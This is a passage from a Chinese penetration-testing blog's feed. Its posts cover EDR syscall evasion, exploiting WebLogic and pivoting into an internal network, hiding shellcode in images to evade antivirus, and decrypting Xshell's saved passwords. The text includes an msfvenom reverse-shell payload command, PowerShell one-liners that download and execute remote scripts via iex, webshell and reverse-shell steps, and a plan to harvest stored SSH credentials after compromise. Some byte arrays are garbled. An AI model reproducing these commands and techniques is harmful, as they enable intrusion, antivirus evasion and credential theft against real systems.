class="line"></span><br><span class="line">  transform(iterator)&#123;</span><br><span class="line">      let instruction = iterator.next()</span><br><span class="line">      do&#123;</span><br><span class="line">        if(instruction.mnemonic == &quot;syscall&quot;)&#123;</span><br><span class="line">            var addrInt = instruction.address.toInt32()</span><br><span class="line">            //If the syscall is coming from somewhere outside the bounds of NTDLL</span><br><span class="line">            //then it may be malicious</span><br><span class="line">            if(addrInt &lt; ntdllBase.toInt32() || addrInt &gt; ntdllOffset.toInt32())&#123;</span><br><span class="line">                send(&quot;[+] Found a potentially malicious syscall&quot;)</span><br><span class="line">                iterator.putCallout(onMatch)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      iterator.keep()</span><br><span class="line">      &#125; while ((instruction = iterator.next()) !== null)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">function onMatch(context)&#123;</span><br><span class="line">    send(&quot;[+] Syscall number: &quot; + context.rax)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>syscall技术研究出来已经几年了，但也没有停滞不前，随着AV/EDR的增强，攻击技术自然也要进步，产出了很多地狱之门的变体，但万变不离其宗，深入理解原理才能更好的Bypass。</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.crisprx.top/archives/540</span><br><span class="line">https://www.anquanke.com/post/id/261582</span><br><span class="line">https://github.com/timwhitez/Spoofing-Gate		</span><br><span class="line">https://github.com/am0nsec/HellsGate/		</span><br><span class="line">https://github.com/jthuraisamy/SysWhispers2		</span><br><span class="line">https://www.mdsec.co.uk/2022/01/edr-parallel-asis-through-analysis/</span><br><span class="line">https://passthehashbrowns.github.io/detecting-direct-syscalls-with-frida</span><br><span class="line">https://klezvirus.github.io/RedTeaming/AV_Evasion/NoSysWhisper/</span><br></pre></td></tr></table></figure>



<p>Peace.</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>syscall</tag>
        <tag>红蓝对抗</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogicRCE到内网渗透</title>
    <url>/2021/09/09/weblogicRCE/</url>
    <content><![CDATA[<p>本文首发于t00ls论坛</p>
<p><a href="https://www.t00ls.net/thread-62545-1-1.html">https://www.t00ls.net/thread-62545-1-1.html</a></p>
<span id="more"></span>

<p>准备利用网上公开的exp 打一下weblogic的rce</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110151087.png" alt="image-20210904110151087"></p>
<p>找到一个  </p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110223640.png" alt="image-20210904110223640"></p>
<p>好家伙 直接root 看来webshell就可以拿到root权限</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110315655.png" alt="image-20210904110315655"></p>
<p>下面准备写入一句话拿webshell 前提还得找到网站的路径<br>随便用dirsearch扫了一下 就出来了 看来这个站还是没有什么防护</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110339407.png" alt="image-20210904110339407"></p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110425433.png" alt="image-20210904110425433"></p>
<p>准备直接传shell 刚开始我是直接传的冰蝎马 冰蝎一直报错 连接不上<br>确认了密钥是正确的  可以正常解析 也没有被拦截 emmm 换蚁剑吧</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110522186.png" alt="image-20210904110522186"></p>
<p>为了防止被拦截啥的 对一句话进行了简单的base64加密 蚁剑成功连接</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110601945.png" alt="image-20210904110601945"></p>
<p>这时候朋友跟我说他的冰蝎可以正常连接 我：？？？？  果然是我冰蝎的问题 换了个冰蝎正常连接</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110648554.png" alt="image-20210904110648554"></p>
<p>确认了是root权限 并且是Linux的主机 想办法上线msf</p>
<p>探测是否出网</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110721080.png" alt="image-20210904110721080"></p>
<p>看来是存在内网的</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110748593.png" alt="image-20210904110748593"></p>
<p>emm看来还有域</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904110811515.png" alt="image-20210904110811515"></p>
<p>访问一下这个域名 看来应该是可以利用 但这里先不管</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111059001.png" alt="image-20210904111059001"></p>
<p>emmm 想办法代理一下 首先尝试的是 reGeorg+proxifier 组合拳</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111122825.png" alt="image-20210904111122825"></p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111139234.png" alt="image-20210904111139234"></p>
<p>但是连接也太差了吧 总是一会就断开连接</p>
<p>不得不考虑别的代理工具  尝试了frp 报错了 最后试了毒刺 成功代理 但是也不是很稳定</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111227899.png" alt="image-20210904111227899"></p>
<p>这个时候已经成功实现端口转发</p>
<p>访问了前文内网的web服务 403</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111245684.png" alt="image-20210904111245684"></p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111359773.png" alt="image-20210904111359773"></p>
<p>冰蝎直接反弹shell到msf</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111314051.png" alt="image-20210904111314051"></p>
<p>这个时候应该先进程迁移一下 但连接时候设置的这个payload 不支持进程迁移 可以尝试其他Linux后门 设置个计划任务啥的 这里就不演示了</p>
<p>前面发现了存在内网  准备批量横向 先拿经典的永恒之蓝打一套</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111442765.png" alt="image-20210904111442765"></p>
<p>也是发现了几个可以利用的445端口  但因为连接不稳定 也总是扫着扫着就断开</p>
<p><img src="/2021/09/09/weblogicRCE/image-20210904111520553.png" alt="image-20210904111520553"></p>
<p>打到这里确实挺累的  剩下的下次再打</p>
<p>总结：<br>这次还是比较幸运 没有waf webshell的权限 直接就是root 也省去了提权的步骤 内网代理直接拿到了Linux服务器的shell<br>但因为代理不稳定 对Linux的内网渗透不太熟悉(菜) 这次就到这 下次打下其他的Windows主机试试</p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode隐写RGB过火绒、360</title>
    <url>/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/</url>
    <content><![CDATA[<p>cs篇将Shellcode隐写到正常BMP图片中，把字符串拆成字节，写入每个像素的alpha通道中，然后上传到可信任的网站下偏移拼接shellcode进行远程动态加载，能有效地增加了免杀性和隐匿性。</p>
<p>首先在cs生成shellcode</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143523433.png" alt="image-20210826143523433"></p>
<h5 id="MSF篇"><a href="#MSF篇" class="headerlink" title="MSF篇"></a>MSF篇</h5><p>在msf生成ps文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom-pwindows/x64/meterpreter/reverse_httpLHOST=192.168.82.134LPORT=7788-fpsh-reflection&gt;msf.ps1</span><br></pre></td></tr></table></figure>



<p>后面都一样</p>
<p>将payload放在与Invoke-PSImage.ps1同一目录下</p>
<p>提前准备一张图片用于生成包含shellcode的图片</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143547986.png" alt="image-20210826143547986"></p>
<p>在当前目录下打开powershell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted -Scope CurrentUser				//设置脚本策略</span><br><span class="line">Import-Module .\Invoke-PSimage.ps1									//导入脚本模块</span><br><span class="line">Invoke-PSImage -Script .\payload.ps1 -Image .\0range.png -Out .\0range.jpg -Web//生成用于远程加载的png图片</span><br></pre></td></tr></table></figure>



<p>同时会生成一段powershll的shellcode</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143601038.png" alt="image-20210826143601038"></p>
<p>在公网服务器开启web服务，同时将上面生成的图片传到网站路径用于加载，生成的那段shellcode中的example.com改成自己web服务的地址就好</p>
<p>本地运行后火绒和360正常过</p>
<p>!<img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143623757.png" alt="image-20210826143623757"></p>
<p>但是被defender拦了，尝试用海莲花加密，还是一样被拦截</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143637852.png" alt="image-20210826143637852"></p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143651364.png" alt="image-20210826143651364"></p>
<p>看来简单的加密拆分混淆已经过不了defender了，得另寻他路</p>
<p>看到有师傅Powershell内存中执行exe，试一试远程加载反射注入PE</p>
<h6 id="本地编码payload"><a href="#本地编码payload" class="headerlink" title="本地编码payload"></a>本地编码payload</h6><p>powershell下执行将自己的马子改下路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">functionConvert-BinaryToString&#123;</span><br><span class="line">	[CmdletBinding()]param(</span><br><span class="line">	[string]$FilePath)</span><br><span class="line">	try&#123;</span><br><span class="line">	$ByteArray=[System.IO.File]::ReadAllBytes($FilePath);</span><br><span class="line">	&#125;</span><br><span class="line">	catch&#123;</span><br><span class="line">	throw&quot;Failedtoreadfile.Ensurethatyouhavepermissiontothefile,andthatthefilepathiscorrect.&quot;;&#125;</span><br><span class="line">	if($ByteArray)&#123;</span><br><span class="line">	$Base64String=[System.Convert]::ToBase64String($ByteArray);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">throw&#x27;$ByteArrayis$null.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">Write-Output-InputObject$Base64String;</span><br><span class="line">&#125;</span><br><span class="line">Convert-BinaryToStringE:\0.渗透工具\免杀\powershell\Invoke-Obfuscation-master\0range.ps1&gt;E:\res.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143704812.png" alt="image-20210826143704812"></p>
<h6 id="目标机器远程加载powerspolit的PE反射模块"><a href="#目标机器远程加载powerspolit的PE反射模块" class="headerlink" title="目标机器远程加载powerspolit的PE反射模块"></a>目标机器远程加载powerspolit的PE反射模块</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iex(New-ObjectNet.WebClient).DownloadString(&quot;http://服务器IP/Invoke-ReflectivePEInjection.ps1&quot;)</span><br></pre></td></tr></table></figure>



<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826144726424.png" alt="image-20210826144726424"></p>
<p>加密后显示字符过长。。。。</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826144807458.png" alt="image-20210826144807458"></p>
<p>这里先跳过看看后面是否可以正常运行</p>
<h6 id="继续加载base64编码后得payload"><a href="#继续加载base64编码后得payload" class="headerlink" title="继续加载base64编码后得payload"></a>继续加载base64编码后得payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b64Str=(New-ObjectNet.WebClient).DownloadString(&quot;http://xxxx/res.txt&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143735521.png" alt="image-20210826143735521"></p>
<h6 id="解码payload"><a href="#解码payload" class="headerlink" title="解码payload"></a>解码payload</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$PEBytes=[System.Convert]::FromBase64String($InputString)</span><br></pre></td></tr></table></figure>

<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143747842.png" alt="image-20210826143747842"></p>
<h6 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h6><p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143801107.png" alt="image-20210826143801107"></p>
<p>。。进行到这里又陷入了僵局</p>
<p>一直在尝试免杀脚本内容，但是忽略了defender查杀前面的iex函数将iex换为别名Invoke-Expression也不可以</p>
<p><img src="/2021/12/28/shellcode%E9%9A%90%E5%86%99RGB%E8%BF%87%E6%9F%9060%E6%9F%90%E7%BB%92/image-20210826143814853.png" alt="image-20210826143814853"></p>
<p>Windows针对powershell的检测主要是AMSI接口。</p>
<p>主要检测</p>
<ol>
<li>文件</li>
<li>内存</li>
<li>数据流</li>
</ol>
<p>其实想到可以dll劫持，但是要建立在权限足够的基础上，还有修改注册表什么的，但是权限足够的话就不需要这个方法了……</p>
<p>实在找不到好的方法了。。。。菜鸡叹气</p>
<p>这里其实也可以隐写其他ps脚本，比如mimikatzpsexec等等工具，思路打开，路子很多。</p>
<p>几个月前写的了，现在发出来，虽然现在会了点方法，不过还是要感叹一句，defender静态查杀挺强的。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>隐写</tag>
      </tags>
  </entry>
  <entry>
    <title>造轮子记(附xshell7解密逆向分析)</title>
    <url>/2022/02/18/xshell%E6%A1%86%E6%9E%B6/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>博客好长时间没更了，就把这段时间做的一点事情记录下吧。尝试第一次造轮子，写个xshell的密码读取工具（公司没有逼迫我qaq）。也挺好，有点压力也有动力，中间好多次想放弃。c语言实在是太太太太麻烦了。有了bug得扣内存去调试，解密出来乱码了也要读内存。头大。另外只是读取xshell6的密码，7的话用ida简单看了下，没找到加密函数，遂放弃。（我太菜了）</p>
<p>使用场景：</p>
<p>拿到主机权限后，上传该工具，一键读取xshell中存储的 host和账密。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">读取并不难，密码不是明文传输，而是加密后的，解密的操作也浪费了很长时间。</span><br><span class="line">如果存在  .xsh 文件  读取其中内容</span><br><span class="line">解密条件： 当前用户的username和sid (whoami /user) 、xsh中的password密码</span><br></pre></td></tr></table></figure>



<h1 id="0x01-加密分析"><a href="#0x01-加密分析" class="headerlink" title="0x01 加密分析"></a>0x01 加密分析</h1><p>  版本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xshell7:    %userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</span><br><span class="line">xshell6:    %userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</span><br><span class="line">XShell5:  	%userprofile%\Documents\NetSarang\Xshell\Sessions</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username+sid -&gt; key   </span><br><span class="line">sha256(&quot;初始密码&quot;) -&gt;CheckSum</span><br></pre></td></tr></table></figure>

<h2 id="1-密钥："><a href="#1-密钥：" class="headerlink" title="1.密钥："></a>1.密钥：</h2><h4 id="lt-5-1"><a href="#lt-5-1" class="headerlink" title="&lt;5.1"></a>&lt;5.1</h4><p>Xshell 使用 MD5 算法来生成用于 RC4 密码的密钥，且 使用 16 字节长的 ASCII 字符串 MD5 摘要<code>!X@s#h$e%l^l&amp;</code>作为 RC4 密码密钥</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Key = MD5(&quot;!X@s#h$e%l^l&amp;&quot;); </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[<span class="number">16</span>] = &#123;</span><br><span class="line">    <span class="number">0xba</span>, <span class="number">0x2d</span>, <span class="number">0x9b</span>, <span class="number">0x7e</span>, <span class="number">0x9c</span>, <span class="number">0xca</span>, <span class="number">0x73</span>, <span class="number">0xd1</span>, </span><br><span class="line">    <span class="number">0x52</span>, <span class="number">0xb2</span>, <span class="number">0x67</span>, <span class="number">0x72</span>, <span class="number">0x66</span>, <span class="number">0x2d</span>, <span class="number">0xf5</span>, <span class="number">0x5e</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="5-1或5-2"><a href="#5-1或5-2" class="headerlink" title="5.1或5.2"></a>5.1或5.2</h4><p>XShell 使用 SHA-256 算法来生成密钥，密钥是当前操作系统帐户的 SID 字符串的 32 字节长的 SHA-256 摘要</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">For example, <span class="keyword">if</span> your current OS account<span class="number">&#x27;</span>s SID <span class="built_in">string</span> is</span><br><span class="line"></span><br><span class="line">S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-917267712</span><span class="number">-1342860078</span><span class="number">-1792151419</span><span class="number">-512</span></span><br><span class="line">the <span class="number">32</span>-bytes-<span class="keyword">long</span> SHA<span class="number">-256</span> digest would be</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xCE</span>, <span class="number">0x97</span>, <span class="number">0xBE</span>, <span class="number">0xA9</span>, <span class="number">0x0C</span>, <span class="number">0x2A</span>, <span class="number">0x40</span>, <span class="number">0xB9</span>,</span><br><span class="line">    <span class="number">0x5C</span>, <span class="number">0xC0</span>, <span class="number">0x79</span>, <span class="number">0x74</span>, <span class="number">0x1D</span>, <span class="number">0xDC</span>, <span class="number">0x03</span>, <span class="number">0xCB</span>,</span><br><span class="line">    <span class="number">0x39</span>, <span class="number">0xAB</span>, <span class="number">0x3D</span>, <span class="number">0xE5</span>, <span class="number">0x26</span>, <span class="number">0x7A</span>, <span class="number">0x3B</span>, <span class="number">0x11</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x4B</span>, <span class="number">0x96</span>, <span class="number">0x3C</span>, <span class="number">0x93</span>, <span class="number">0x6F</span>, <span class="number">0x9C</span>, <span class="number">0xD4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="gt-5-2"><a href="#gt-5-2" class="headerlink" title="&gt;5.2"></a>&gt;5.2</h4><p>这种情况与前一种（版本 5.1 或 5.2）类似，密钥是当前操作系统帐户名称（区分大小写）和当前操作系统帐户的 SID 字符串组合的 SHA-256 摘要。例如，如果您当前的操作系统帐户的名称和 SID 是（注意是当前登陆用户哈） Administrator S-1-5-21-917267712-1342860078-1792151419-512 密钥是字符串的 32 字节长 SHA-256 摘要”AdministratorS-1-5-21-917267712-1342860078-1792151419-512”</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">For example, <span class="keyword">if</span> your current OS account<span class="number">&#x27;</span>s name <span class="keyword">and</span> SID are</span><br><span class="line"></span><br><span class="line">Administrator</span><br><span class="line">S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-917267712</span><span class="number">-1342860078</span><span class="number">-1792151419</span><span class="number">-512</span></span><br><span class="line">the key is the <span class="number">32</span>-bytes-<span class="keyword">long</span> SHA<span class="number">-256</span> digest of a <span class="built_in">string</span> <span class="string">&quot;AdministratorS-1-5-21-917267712-1342860078-1792151419-512&quot;</span>:</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x8E</span>, <span class="number">0x12</span>, <span class="number">0x29</span>, <span class="number">0xDC</span>, <span class="number">0x1F</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0xB9</span>,</span><br><span class="line">    <span class="number">0xBB</span>, <span class="number">0xCD</span>, <span class="number">0x94</span>, <span class="number">0xC2</span>, <span class="number">0xAB</span>, <span class="number">0x0A</span>, <span class="number">0xF3</span>, <span class="number">0xB9</span>,</span><br><span class="line">    <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x6F</span>, <span class="number">0x06</span>, <span class="number">0xE3</span>, <span class="number">0x9D</span>, <span class="number">0x24</span>, <span class="number">0x80</span>,</span><br><span class="line">    <span class="number">0x6A</span>, <span class="number">0x74</span>, <span class="number">0xCD</span>, <span class="number">0x7E</span>, <span class="number">0x0B</span>, <span class="number">0x69</span>, <span class="number">0xB3</span>, <span class="number">0x78</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="用户设置了主密码"><a href="#用户设置了主密码" class="headerlink" title="用户设置了主密码"></a>用户设置了主密码</h4><p>密钥是用户设置了主密钥的 SHA-256摘要</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">For example, <span class="keyword">if</span> I <span class="built_in">set</span> master password with <span class="string">&quot;123123&quot;</span>, the key that is used in RC4 cipher is</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Key[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0xca</span>, <span class="number">0xe3</span>, <span class="number">0x5c</span>, <span class="number">0xe8</span>, <span class="number">0xa9</span>, <span class="number">0xb0</span>, <span class="number">0x24</span>, </span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x78</span>, <span class="number">0xbf</span>, <span class="number">0x28</span>, <span class="number">0xe4</span>, <span class="number">0x96</span>, <span class="number">0x6c</span>, <span class="number">0x2c</span>, </span><br><span class="line">    <span class="number">0xe1</span>, <span class="number">0xb8</span>, <span class="number">0x38</span>, <span class="number">0x57</span>, <span class="number">0x23</span>, <span class="number">0xa9</span>, <span class="number">0x6a</span>, <span class="number">0x6b</span>, </span><br><span class="line">    <span class="number">0x83</span>, <span class="number">0x88</span>, <span class="number">0x58</span>, <span class="number">0xcd</span>, <span class="number">0xd6</span>, <span class="number">0xca</span>, <span class="number">0x0a</span>, <span class="number">0x1e</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="2-计算原始密码的SHA-256摘要"><a href="#2-计算原始密码的SHA-256摘要" class="headerlink" title="2.计算原始密码的SHA-256摘要"></a>2.计算原始密码的SHA-256摘要</h2><p>此步骤将仅针对会话文件版本 &gt;= 5.1 执行，且这个 32 字节长的数据将被视为校验和并附加到加密的密码中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">如果原密码是 <span class="string">&quot;This is a test&quot;</span>, the SHA<span class="number">-256</span> digest would be:</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Checksum[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xC7</span>, <span class="number">0xBE</span>, <span class="number">0x1E</span>, <span class="number">0xD9</span>, <span class="number">0x02</span>, <span class="number">0xFB</span>, <span class="number">0x8D</span>, <span class="number">0xD4</span>,</span><br><span class="line">    <span class="number">0xD4</span>, <span class="number">0x89</span>, <span class="number">0x97</span>, <span class="number">0xC6</span>, <span class="number">0x45</span>, <span class="number">0x2F</span>, <span class="number">0x5D</span>, <span class="number">0x7E</span>,</span><br><span class="line">    <span class="number">0x50</span>, <span class="number">0x9F</span>, <span class="number">0xBC</span>, <span class="number">0xDB</span>, <span class="number">0xE2</span>, <span class="number">0x80</span>, <span class="number">0x8B</span>, <span class="number">0x16</span>,</span><br><span class="line">    <span class="number">0xBC</span>, <span class="number">0xF4</span>, <span class="number">0xED</span>, <span class="number">0xCE</span>, <span class="number">0x4C</span>, <span class="number">0x07</span>, <span class="number">0xD1</span>, <span class="number">0x4E</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="3-初始化密码"><a href="#3-初始化密码" class="headerlink" title="3.初始化密码"></a>3.初始化密码</h2><p>Xmanager 使用生成的密钥来初始化 RC4 密码。</p>
<h2 id="4-加密密码"><a href="#4-加密密码" class="headerlink" title="4.加密密码"></a>4.加密密码</h2><p>Xmanager 使用初始化的 RC4 密码加密原始密码</p>
<h3 id="4-1-对于会话文件版本-lt-5-1"><a href="#4-1-对于会话文件版本-lt-5-1" class="headerlink" title="4.1 对于会话文件版本 &lt; 5.1"></a>4.1 对于会话文件版本 &lt; 5.1</h3><ol>
<li><p>由 XShell 加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned  char EncryptedPassword[] = &#123;</span><br><span class="line">     0xff , 0xa2 , 0x9a , 0x4e , 0xb2 , 0xb0 , 0x9b , 0x47 , </span><br><span class="line">     0x26 , 0x86 , 0xbd , 0x32 , 0x01 , 0x64 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="4-2-对于会话文件版本-5-1-OR-5-2"><a href="#4-2-对于会话文件版本-5-1-OR-5-2" class="headerlink" title="4.2 对于会话文件版本 == 5.1 OR 5.2"></a>4.2 对于会话文件版本 == 5.1 OR 5.2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned  char EncryptedPassword[] = &#123;</span><br><span class="line">     0x84 , 0x83 , 0x31 , 0x23 , 0x24 , 0x37 , 0x1D , 0xB2 ,</span><br><span class="line">     0x6C , 0x54 , 0x87 , 0x5B , 0x6E , 0xE9 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-对于会话文件版本-gt-5-2"><a href="#4-3-对于会话文件版本-gt-5-2" class="headerlink" title="4.3 对于会话文件版本 &gt; 5.2"></a>4.3 对于会话文件版本 &gt; 5.2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned  char EncryptedPassword[] = &#123;</span><br><span class="line">     0xCE , 0xFD , 0xB5 , 0x3B , 0x5C , 0x78 , 0xDE , 0xA4 ,</span><br><span class="line">     0x6C , 0xDD , 0xCE , 0x4D , 0x72 , 0x40 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="4-4-对于用户设置了主密码的情况"><a href="#4-4-对于用户设置了主密码的情况" class="headerlink" title="4.4 对于用户设置了主密码的情况"></a>4.4 对于用户设置了主密码的情况</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unsigned  char EncryptedPassword[] = &#123;</span><br><span class="line">     0x46 , 0xb9 , 0xb7 , 0x3f , 0x70 , 0x0b , 0xd2 , 0x20 , </span><br><span class="line">     0xd5 , 0xee , 0x70 , 0x5b , 0x4b , 0x66 </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="5-将校验和附加到加密密码。"><a href="#5-将校验和附加到加密密码。" class="headerlink" title="5. 将校验和附加到加密密码。"></a>5. 将校验和附加到加密密码。</h2><p><strong>此步骤将仅对 &gt;= 5.1 的会话文件版本执行。</strong></p>
<h3 id="5-1-对于会话文件版本-5-1-或-5-2"><a href="#5-1-对于会话文件版本-5-1-或-5-2" class="headerlink" title="5.1 对于会话文件版本 == 5.1 或 5.2"></a>5.1 对于会话文件版本 == 5.1 或 5.2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> unsigned char FinalResult [ ] =</span><br><span class="line">     &#123; 0x84,0x83,0x31,0x23,0x24,0x37，0x1d，0xb2,0x6c，0x54，0x87,0x5b，0x0，0xe9，0xc7，0xbe，0x1e，0xD9，0x02，0xFB，0x8D，0xD4 _ _</span><br><span class="line">     _ _ _ _ _ _ _ _ _ _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ _ , 0xD4 , 0x89 ,</span><br><span class="line">    0x97，0xC6,0x45,0x2f，0x5d，0x7e，0x50,0x9f，0xbc，0xdb，0xe2,0x80,0x8b，</span><br><span class="line">     0x16，0xbc，0xf4，0xed，0xce，0x4c，0x07，0xd1，0x4e &#125; </span><br><span class="line">; _ _ _ _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ _ _ _ _ _</span><br></pre></td></tr></table></figure>

<h3 id="5-2-对于会话文件版本-gt-5-2"><a href="#5-2-对于会话文件版本-gt-5-2" class="headerlink" title="5.2 对于会话文件版本 &gt; 5.2"></a>5.2 对于会话文件版本 &gt; 5.2</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> unsigned char FinalResult [ ] = &#123;</span><br><span class="line">     0xCE，0xFD，0xB5，0x3b，0x5c，</span><br><span class="line">     0x78，0xDE，0xA4，0x6c，0xdd，0xce，0x4d，0x72，0x40，0xc7，0xbe，0x1e，0xD9，0x02，0xFB，0x8D，0xD4 _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ , 0xD4 , 0x89 ,</span><br><span class="line">    0x97，0xC6,0x45,0x2f，0x5d，0x7e，0x50,0x9f，0xbc，0xdb，0xe2,0x80,0x8b，</span><br><span class="line">     0x16，0xbc，0xf4，0xed，0xce，0x4c，0x07，0xd1，0x4e &#125; </span><br><span class="line">; _ _ _ _ _ _ _ _ _</span><br><span class="line">     _ _ _ _ _ _ _ _ _ _</span><br></pre></td></tr></table></figure>

